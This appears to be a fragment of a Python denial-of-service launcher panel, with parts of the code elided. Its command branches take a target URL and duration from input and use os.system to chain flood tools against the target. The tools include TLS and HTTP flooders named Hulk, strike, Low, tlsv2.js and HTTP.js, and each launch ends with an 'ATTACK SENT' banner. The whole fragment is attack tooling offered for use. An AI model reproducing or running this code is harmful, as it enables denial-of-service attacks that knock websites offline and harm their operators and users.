...
""")
			...
			try:
				...
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd godzilla && ./tls {url} {time} 300 2 && cd godzilla && node tlsv2.js {url} {time} 300 2 && cd randomstring && ./screetvip {url} {time} 300 5 && cd godzilla && node HTTP.js {url} 500 1 {time}')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
...
""")
			...
			try:
				...
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd resources && go run Hulk.go -site {url} -data GET && cd resources && go run strike.go -url {url} GET && cd resources && go run Low.go -site {url} -data POST')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
...
""")
			...
			try:
				...
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd godzilla && ./tls {url} {time} 300 2 && cd godzilla && node tlsv2.js {url} {time} 300 2 && cd randomstring && ./screetvip {url} {time} 300 5 && cd godzilla && node HTTP.js {url} 500 1 {time} && cd resources && go run Hulk.go -site {url} -data GET && cd resources && go run strike.go -url {url} GET && cd resources && go run Low.go -site {url} -data POST')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
